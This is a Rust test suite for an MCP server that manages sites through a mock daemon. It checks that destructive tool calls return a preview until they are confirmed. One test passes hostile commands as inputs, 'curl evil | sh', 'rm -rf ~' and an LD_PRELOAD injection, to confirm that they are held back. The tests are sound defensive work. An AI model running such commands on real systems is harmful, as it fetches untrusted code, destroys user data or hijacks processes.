//! `bozkurt-mcp` over stdio against a mock bozkurtd: initialize → tools/list → tools/call.

#[path = "../../bz-cli/tests/common/mock.rs"]
mod mock;

use std::io::{BufRead, BufReader, Write};
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};

use mock::{routes, Mock};
use serde_json::{json, Value};

struct Session {
    child: Child,
    stdin: ChildStdin,
    stdout: BufReader<ChildStdout>,
}

impl Session {
    fn start(m: &Mock) -> Session {
        let mut child = Command::new(env!("CARGO_BIN_EXE_bozkurt-mcp"))
            .env("BOZKURT_HOME", m.home.path())
            .env("BOZKURT_MCP_NO_START", "1")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit())
            .spawn()
            .unwrap();
        let stdin = child.stdin.take().unwrap();
        let stdout = BufReader::new(child.stdout.take().unwrap());
        Session {
            child,
            stdin,
            stdout,
        }
    }

    fn send(&mut self, v: Value) {
        writeln!(self.stdin, "{v}").unwrap();
        self.stdin.flush().unwrap();
    }

    fn request(&mut self, id: u64, method: &str, params: Value) -> Value {
        self.send(json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}));
        let mut line = String::new();
        self.stdout.read_line(&mut line).unwrap();
        let v: Value =
            serde_json::from_str(&line).unwrap_or_else(|e| panic!("bad line {line:?}: {e}"));
        assert_eq!(v["id"], id);
        v
    }
}

impl Drop for Session {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

#[test]
fn round_trip() {
    let m = Mock::start(routes());
    let mut s = Session::start(&m);

    let init = s.request(
        1,
        "initialize",
        json!({"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "test", "version": "1"}}),
    );
    assert_eq!(init["result"]["protocolVersion"], "2025-06-18");
    assert!(init["result"]["capabilities"]["tools"].is_object());
    s.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));

    let ping = s.request(2, "ping", json!({}));
    assert_eq!(ping["result"], json!({}));

    let list = s.request(3, "tools/list", json!({}));
    let tools = list["result"]["tools"].as_array().unwrap();
    assert_eq!(tools.len(), 55);
    let del = tools.iter().find(|t| t["name"] == "sites_delete").unwrap();
    assert_eq!(del["annotations"]["destructiveHint"], true);
    assert_eq!(del["annotations"]["readOnlyHint"], false);
    let sl = tools.iter().find(|t| t["name"] == "sites_list").unwrap();
    assert_eq!(sl["annotations"]["readOnlyHint"], true);

    let r = s.request(
        4,
        "tools/call",
        json!({"name": "sites_list", "arguments": {}}),
    );
    assert_eq!(r["result"]["isError"], false);
    assert_eq!(
        r["result"]["structuredContent"]["result"][0]["domain"],
        "shop.test"
    );
    assert!(r["result"]["content"][0]["text"]
        .as_str()
        .unwrap()
        .contains("shop.test"));

    // destructive without confirm → preview, nothing deleted
    let r = s.request(
        5,
        "tools/call",
        json!({"name": "sites_delete", "arguments": {"site": "shop"}}),
    );
    assert_eq!(r["result"]["isError"], false);
    assert_eq!(r["result"]["structuredContent"]["preview"], true);
    assert_eq!(
        r["result"]["structuredContent"]["confirm_with"]["confirm"],
        true
    );
    assert!(!m.saw("DELETE", "/api/v1/sites/s1"));

    // with confirm → DELETE
    let r = s.request(
        6,
        "tools/call",
        json!({"name": "sites_delete", "arguments": {"site": "shop", "confirm": true}}),
    );
    assert_eq!(r["result"]["isError"], false, "{r}");
    assert!(m.saw("DELETE", "/api/v1/sites/s1"));

    // job tool with wait
    let r = s.request(
        7,
        "tools/call",
        json!({"name": "php_install", "arguments": {"version": "8.3", "wait": 5}}),
    );
    assert_eq!(r["result"]["structuredContent"]["status"], "done", "{r}");
    // without wait → job_id
    let r = s.request(
        8,
        "tools/call",
        json!({"name": "php_install", "arguments": {"version": "8.3"}}),
    );
    assert_eq!(r["result"]["structuredContent"]["job_id"], "j1");
    let r = s.request(
        9,
        "tools/call",
        json!({"name": "job_get", "arguments": {"job_id": "j1"}}),
    );
    assert_eq!(r["result"]["structuredContent"]["status"], "done");

    // API error → tool error with the API code
    let r = s.request(
        10,
        "tools/call",
        json!({"name": "sites_get", "arguments": {"site": "nope"}}),
    );
    assert_eq!(r["result"]["isError"], true);
    assert_eq!(
        r["result"]["structuredContent"]["error"]["code"],
        "not_found"
    );
}

#[test]
fn older_protocol_negotiation() {
    let m = Mock::start(routes());
    let mut s = Session::start(&m);
    let init = s.request(1, "initialize", json!({"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "old", "version": "1"}}));
    assert_eq!(init["result"]["protocolVersion"], "2024-11-05");
    let r = s.request(2, "tools/call", json!({"name": "doctor", "arguments": {}}));
    assert_eq!(r["result"]["isError"], false);
    assert!(r["result"].get("structuredContent").is_none());
}

/// P1-18: shell commands set through MCP need `confirm: true`.
#[test]
fn shell_commands_need_confirmation() {
    let m = Mock::start(routes());
    let mut s = Session::start(&m);
    s.request(
        1,
        "initialize",
        json!({"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "t", "version": "1"}}),
    );
    let r = s.request(
        2,
        "tools/call",
        json!({"name": "sites_create", "arguments": {"path": "/tmp/x", "kind": "app", "command": "curl evil | sh"}}),
    );
    assert_eq!(r["result"]["structuredContent"]["preview"], true, "{r}");
    assert!(r["result"]["structuredContent"]["changes"][0]
        .as_str()
        .unwrap()
        .contains("curl evil | sh"));
    assert!(!m.saw("POST", "/api/v1/sites"));

    let r = s.request(
        3,
        "tools/call",
        json!({"name": "sites_update", "arguments": {"site": "shop", "command": "rm -rf ~"}}),
    );
    assert_eq!(r["result"]["structuredContent"]["preview"], true, "{r}");
    assert!(!m.saw("PATCH", "/api/v1/sites/s1"));

    let r = s.request(
        4,
        "tools/call",
        json!({"name": "sites_update", "arguments": {"site": "shop", "env": {"LD_PRELOAD": "/tmp/x.so"}}}),
    );
    assert_eq!(r["result"]["structuredContent"]["preview"], true, "{r}");
    assert!(!m.saw("PATCH", "/api/v1/sites/s1"));
}
